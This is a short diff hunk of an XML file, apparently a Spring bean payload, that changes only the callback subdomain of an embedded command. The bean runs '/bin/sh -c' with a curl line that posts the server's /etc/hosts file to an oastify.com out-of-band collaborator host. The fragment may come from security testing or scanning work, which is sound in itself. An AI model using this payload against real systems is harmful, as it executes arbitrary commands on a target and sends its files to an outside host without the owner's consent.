@@ -7,7 +7,7 @@
       <list>
         <value>/bin/sh</value>
         <value>-c</value>
-        <value>curl -fsS --max-time 15 -X POST --data-binary @/etc/hosts http://g3k60egf5zcangb0trd35s19x033rs.oastify.com/etc-hosts</value>
+        <value>curl -fsS --max-time 15 -X POST --data-binary @/etc/hosts http://c4h21ahb6vd6occwunez6o25yw40sp.oastify.com/etc-hosts</value>
       </list>
     </constructor-arg>
   </bean>
